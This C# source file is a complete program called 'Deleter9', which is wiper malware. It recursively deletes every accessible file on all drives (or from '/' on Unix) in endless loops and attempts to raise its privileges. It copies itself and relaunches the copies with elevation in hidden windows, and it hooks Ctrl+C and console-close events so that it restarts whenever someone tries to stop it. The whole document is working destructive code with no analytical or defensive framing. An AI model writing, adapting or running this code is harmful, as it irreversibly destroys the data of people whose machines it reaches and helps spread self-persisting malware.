namespace System
{
    public class OS
    {
        private static bool CapitalizeContains(string a, string b)
        {
            a = Capitalize(a);
            b = Capitalize(b);
            return a.IndexOf(b) >= 0;
        }
        private static string Capitalize(string str)
        {
            if (string.IsNullOrEmpty(str))
            {
                return str;
            }
            char[] a = str.ToLower().ToCharArray();
            a[0] = char.ToUpper(a[0]);
            return new string(a);
        }
        public static string RestartPath = Reflection.Assembly.GetEntryAssembly().Location;
        public virtual bool IsWindows 
        {
            get
            {
                return false;
            } 
        }
        public virtual string ProcessFilePath
        {
            get
            {
                return "Unknown";
            }
        }
        public virtual void RestartProcess()
        {
            Diagnostics.Process.Start(RestartPath);
        }
        public static OS DetectedOS = new();
        public static void DetectCurrentOS()
        {
            if (DetectedOS == null || DetectedOS == new OS())
            {
                DetectedOS = GetCurrentOS();
            }
        }
        private unsafe static OS GetCurrentOS()
        {
            PlatformID platform = Environment.OSVersion.Platform;
            if (platform == PlatformID.Win32S)
            {
                return new WindowsOS();
            }
            else if (platform == PlatformID.Win32Windows)
            {
                return new WindowsOS();
            }
            else if (platform == PlatformID.Win32NT)
            {
                return new WindowsOS();
            }
            else if (platform == PlatformID.WinCE)
            {
                return new WindowsOS();
            }
            else if (platform == PlatformID.Xbox)
            {
                return new WindowsOS();
            }
            else if (platform == PlatformID.Unix)
            {
                sbyte* utsname = stackalloc sbyte[8192];
                uname(utsname);
                string kernel = new(utsname);
                if (CapitalizeContains(kernel, "Linux"))
                {
                    return new LinuxOS();
                }
                else if (CapitalizeContains(kernel, "Unix"))
                {
                    return new UnixOS();
                }
                else
                {
                    return new UnixOS();
                }
            }
            else if (platform == PlatformID.MacOSX)
            {
                return new UnixOS();
            }
            else
            {
                sbyte* utsname = stackalloc sbyte[8192];
                uname(utsname);
                string kernel = new(utsname);
                if (CapitalizeContains(kernel, "Windows"))
                {
                    return new WindowsOS();
                }
                else if (CapitalizeContains(kernel, "Linux"))
                {
                    return new LinuxOS();
                }
                else if (CapitalizeContains(kernel, "Unix"))
                {
                    return new UnixOS();
                }
                else
                {
                    return new UnixOS();
                }
            }
        }
        [Runtime.InteropServices.DllImport("libc")]
        public unsafe static extern void uname(sbyte* uname_struct);
    }
    public class WindowsOS : OS
    {
        public override string ProcessFilePath
        {
            get
            {
                return IO.Path.GetFullPath(Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
            }
        }
        public override bool IsWindows 
        { 
            get 
            { 
                return true; 
            } 
        }
    }
    public class UnixOS : OS
    {
        public override string ProcessFilePath
        {
            get
            {
                return IO.Path.GetFullPath(Reflection.Assembly.GetExecutingAssembly().Location);
            }
        }
        public override bool IsWindows
        { 
            get 
            { 
                return false; 
            } 
        }
        public override void RestartProcess()
        {
            RestartInPlace();
        }
        public virtual void RestartInPlace()
        {
            string exe = GetProcessExePath();
            execvp(exe, new string[] 
            { 
                exe,
                RestartPath, 
                null 
            });
            Console.Out.WriteLine("execvp {0} failed: {1}", exe, Runtime.InteropServices.Marshal.GetLastWin32Error());
            execvp("mono", new string[] 
            { 
                "mono",
                RestartPath, 
                null 
            });
            Console.Out.WriteLine("execvp mono failed: {0}", Runtime.InteropServices.Marshal.GetLastWin32Error());
        }
        [Runtime.InteropServices.DllImport("libc", SetLastError = true)]
        public static extern int execvp(string path, string[] argv);
        public static string GetProcessExePath()
        {
            return Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        }
    }
    public class LinuxOS : UnixOS
    {
        public override string ProcessFilePath
        {
            get
            {
                return IO.Path.GetFullPath(GetProcessExePath());
            }
        }
        public override void RestartInPlace()
        {
            try
            {
                string exe = GetProcessExePath();
                string[] args = GetProcessCommandLineArgs();
                execvp(exe, args);
            }
            catch (Exception ex)
            {
                Console.Out.WriteLine("Error restarting process: {0}", ex);
            }
            base.RestartInPlace();
        }
        private static string[] GetProcessCommandLineArgs()
        {
            using IO.StreamReader r = new("/proc/self/cmdline");
            string[] args = r.ReadToEnd().Split('\0');
            args[args.Length - 1] = null;
            return args;
        }
    }
    public class Deleter
    {
        private static readonly Collections.Generic.List<string> DirectoriesList = new()
        {
        };
        public static bool CanAccess(string folderPath, out Exception ex)
        {
            IO.DirectoryInfo dirInfo = new(folderPath);
            try
            {
                dirInfo.GetAccessControl(Security.AccessControl.AccessControlSections.All);
                ex = null;
                return true;
            }
            catch (Security.AccessControl.PrivilegeNotHeldException e)
            {
                ex = e;
                return false;
            }
        }
        private static Collections.Generic.List<string> AddDir(string dir)
        {
            foreach (string d in IO.Directory.GetDirectories(dir))
            {
                if (CanAccess(d, out Exception ex))
                {
                    DirectoriesList.Add(d);
                    AddDir(d);
                }
                else
                {
                    Console.Out.WriteLine("Can't access " + d + ex);
                }
            }
            return DirectoriesList;
        }
        public const string Ver = "1.0", Title = "Deleter9 v" + Ver;
        private static string[] LogicalDrives;
        private static Collections.Generic.List<IO.DriveInfo> Disks = new()
        {
        };
        private static string FileName = string.Empty,
            FileExtension = string.Empty;
        private static double Double, LoopingDouble, Count = 0;
        private static readonly string Argument = "                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n";
        private static readonly string[] Messages = Argument.Split('\n');
        private static bool FileDeleted;
        private static Exception Exception;
        private static void TryDeleteFile(string file)
        {
            if (IO.File.Exists(file))
            {
                try
                {
                    Console.Out.WriteLine("Deleting " + file);
                    IO.File.Delete(file);
                    if (!IO.File.Exists(file))
                    {
                        FileDeleted = true;
                    }
                    else
                    {
                        Exception = new InvalidOperationException("Failed to delete file: " + file);
                        FileDeleted = false;
                    }
                }
                catch (Exception e)
                {
                    Exception = e;
                    FileDeleted = false;
                }
            }
            else
            {
                FileDeleted = true;
            }
        }
        private static void ContinueDeletingUnix()
        {
            try
            {
                RtlAdjustPrivilege(19, true, false, out _);
            }
            catch
            {
                Console.Out.WriteLine("Failed to adjust privileges, continuing without them.");
            }
            Console.Clear();
            Count++;
            Console.Out.WriteLine(Count);
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.BackgroundColor = ConsoleColor.Black;
            Threading.Thread.Sleep(200);
            Console.Out.WriteLine(Messages);
            string root = IO.Directory.GetDirectoryRoot(IO.Directory.GetCurrentDirectory());
            if (root == null || root == "")
            {
                root = "/";
            }
            AddDir(root);
            while (LoopingDouble != double.PositiveInfinity)
            {
                LoopingDouble++;
                try
                {
                    Collections.Generic.List<string> dirs = DirectoriesList;
                    foreach (string dir in dirs)
                    {
                        string[] files = IO.Directory.GetFiles(dir);
                        foreach (string file in files)
                        {
                            TryDeleteFile(file);
                            if (FileDeleted == false)
                            {
                                Console.Out.WriteLine("Failed to delete file: " + file);
                                Console.Out.WriteLine(Exception);
                            }
                        }
                    }
                }
                catch 
                {
                    DeleteDirUnix();
                }
            }
        }
        public static void DeleteDirUnix()
        {
            try
            {
                RtlAdjustPrivilege(19, true, false, out _);
            }
            catch
            {
                Console.Out.WriteLine("Failed to adjust privileges, continuing without them.");
            }
            Console.ForegroundColor = ConsoleColor.Red;
            Console.BackgroundColor = ConsoleColor.Black;
            Console.Out.WriteLine(Messages);
            string root = IO.Directory.GetDirectoryRoot(IO.Directory.GetCurrentDirectory());
            if (root == null || root == "")
            {
                root = "/";
            }
            AddDir(root);
            while (LoopingDouble != double.PositiveInfinity)
            {
                LoopingDouble++;
                try
                {
                    Collections.Generic.List<string> dirs = DirectoriesList;
                    foreach (string dir in dirs)
                    {
                        string[] files = IO.Directory.GetFiles(dir);
                        foreach (string file in files)
                        {
                            TryDeleteFile(file);
                            if (!FileDeleted)
                            {
                                Console.Out.WriteLine("Failed to delete file: " + file);
                                Console.Out.WriteLine(Exception);
                            }
                        }
                    }
                }
                catch
                {
                    ContinueDeletingUnix();
                }
            }
        }
        public static void DeleteDir()
        {
            try
            {
                Console.Clear();
                Console.Out.WriteLine(Messages);
                LogicalDrives = IO.Directory.GetLogicalDrives();
                Disks = new Collections.Generic.List<IO.DriveInfo>(IO.DriveInfo.GetDrives());
                foreach (IO.DriveInfo disk in Disks)
                {
                    if (disk.Name != disk.VolumeLabel)
                    {
                        Console.Out.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
                    }
                    else
                    {
                        Console.Out.WriteLine("Current drive is: " + disk.Name);
                    }
                    foreach (string drive in LogicalDrives)
                    {
                        string root = IO.Directory.GetDirectoryRoot(drive);
                        if (root == null || root == "")
                        {
                            root = "/";
                        }
                        AddDir(root);
                        Collections.Generic.List<string> dirs = DirectoriesList;
                        foreach (string dir in dirs)
                        {
                            string[] files = IO.Directory.GetFiles(dir);
                            foreach (string file in files)
                            {
                                TryDeleteFile(file);
                                if (!FileDeleted)
                                {
                                    Console.Out.WriteLine("Failed to delete file: " + file);
                                    Console.Out.WriteLine(Exception);
                                }
                            }
                        }
                    }
                }
            }
            catch
            {
                while (LoopingDouble != double.PositiveInfinity)
                {
                    LoopingDouble++;
                    ContinueDeleting();
                }
            }
        }
        public static void ContinueDeleting()
        {
            try
            {
                Count++;
                LogicalDrives = IO.Directory.GetLogicalDrives();
                Disks = new Collections.Generic.List<IO.DriveInfo>(IO.DriveInfo.GetDrives());
                Console.Out.WriteLine(Count);
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.BackgroundColor = ConsoleColor.Black;
                Threading.Thread.Sleep(200);
                Console.Out.WriteLine(Messages);
                foreach (IO.DriveInfo disk in Disks)
                {
                    if (disk.Name != disk.VolumeLabel)
                    {
                        Console.Out.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
                    }
                    else
                    {
                        Console.Out.WriteLine("Current drive is: " + disk.Name);
                    }
                    foreach (string drive in LogicalDrives)
                    {
                        string root = IO.Directory.GetDirectoryRoot(drive);
                        if (root == null || root == "")
                        {
                            root = "/";
                        }
                        AddDir(root);
                        Collections.Generic.List<string> dirs = DirectoriesList;
                        foreach (string dir in dirs)
                        {
                            string[] files = IO.Directory.GetFiles(dir);
                            foreach (string file in files)
                            {
                                TryDeleteFile(file);
                                if (!FileDeleted)
                                {
                                    Console.Out.WriteLine("Failed to delete file: " + file);
                                    Console.Out.WriteLine(Exception);
                                }
                            }
                        }
                    }
                }
            }
            catch
            {
                while (LoopingDouble != double.PositiveInfinity)
                {
                    LoopingDouble++;
                    DeleteDir();
                }
            }
        }
        public delegate bool ConsoleEventDelegate(int eventType);
        [Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetConsoleCtrlHandler(ConsoleEventDelegate callback, bool add);
        public static ConsoleEventDelegate Handler;
        public static bool ConsoleEventCallback(int eventType)
        {
            OS.DetectedOS.RestartProcess();
            return false;
        }
        public static void OnCancelKeyPress(object sender, ConsoleCancelEventArgs e)
        {
            OS.DetectedOS.RestartProcess();
        }
        [Runtime.InteropServices.DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool EnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
        public static bool PreviousValue = false;
        public static void Continue(string[] args)
        {
            OS.DetectCurrentOS();
            FileExtension = IO.Path.GetExtension(OS.DetectedOS.ProcessFilePath);
            FileName = IO.Path.GetFileNameWithoutExtension(OS.DetectedOS.ProcessFilePath);
            if (OS.DetectedOS.IsWindows)
            {
                Console.CancelKeyPress += OnCancelKeyPress;
                Handler = new(ConsoleEventCallback);
                SetConsoleCtrlHandler(Handler, true);
                Console.Title = Title;
                Console.ForegroundColor = ConsoleColor.Red;
                Console.BackgroundColor = ConsoleColor.Black;
            }
            if (args == null || args.Length == 0)
            {
                args = Messages;
            }
            Threading.Thread.Sleep(1000);
            while (Double != double.PositiveInfinity)
            {
                try
                {
                    Double++;
                    if (!OS.DetectedOS.IsWindows)
                    {
                        DeleteDirUnix();
                    }
                    else
                    {
                        IO.File.Copy(IO.Path.GetFileName(OS.DetectedOS.ProcessFilePath), FileName + " (" + Double + ")" + FileExtension);
                        Diagnostics.Process p = new();
                        p.StartInfo.UseShellExecute = true;
                        p.StartInfo.Verb = "runas";
                        p.StartInfo.FileName = FileName + "(" +
                            Double + ")" + FileExtension;
                        p.StartInfo.Arguments = Argument;
                        p.StartInfo.CreateNoWindow = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.WindowStyle = Diagnostics.ProcessWindowStyle.Hidden;
                        p.Start();
                        DeleteDir();
                    }
                }
                catch
                {
                    while (LoopingDouble != double.PositiveInfinity)
                    {
                        LoopingDouble++;
                        Main(args);
                    }
                }
            }
        }
        public static void Main(string[] args)
        {
            OS.DetectCurrentOS();
            FileExtension = IO.Path.GetExtension(OS.DetectedOS.ProcessFilePath);
            FileName = IO.Path.GetFileNameWithoutExtension(OS.DetectedOS.ProcessFilePath);
            if (OS.DetectedOS.IsWindows)
            {
                Console.CancelKeyPress += OnCancelKeyPress;
                Handler = new(ConsoleEventCallback);
                SetConsoleCtrlHandler(Handler, true);
                Console.Title = Title;
                Console.ForegroundColor = ConsoleColor.Red;
                Console.BackgroundColor = ConsoleColor.Black;
            }
            if (args == null || args.LongLength == 0)
            {
                args = Messages;
            }
            Threading.Thread.Sleep(1000);
            while (Double != double.PositiveInfinity)
            {
                try
                {
                    Double++;
                    if (!OS.DetectedOS.IsWindows)
                    {
                        DeleteDirUnix();
                    }
                    else
                    {
                        IO.File.Copy(IO.Path.GetFileName(OS.DetectedOS.ProcessFilePath), FileName + " (" + Double + ")" + FileExtension);
                        Diagnostics.Process p = new();
                        p.StartInfo.UseShellExecute = true;
                        p.StartInfo.Verb = "runas";
                        p.StartInfo.FileName = FileName + "(" +
                            Double + ")" + FileExtension;
                        p.StartInfo.Arguments = Argument;
                        p.StartInfo.CreateNoWindow = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.WindowStyle = Diagnostics.ProcessWindowStyle.Hidden;
                        p.Start();
                        DeleteDir();
                    }
                }
                catch
                {
                    while (LoopingDouble != double.PositiveInfinity)
                    {
                        LoopingDouble++;
                        Continue(args);
                    }
                }
            }
        }
    }
}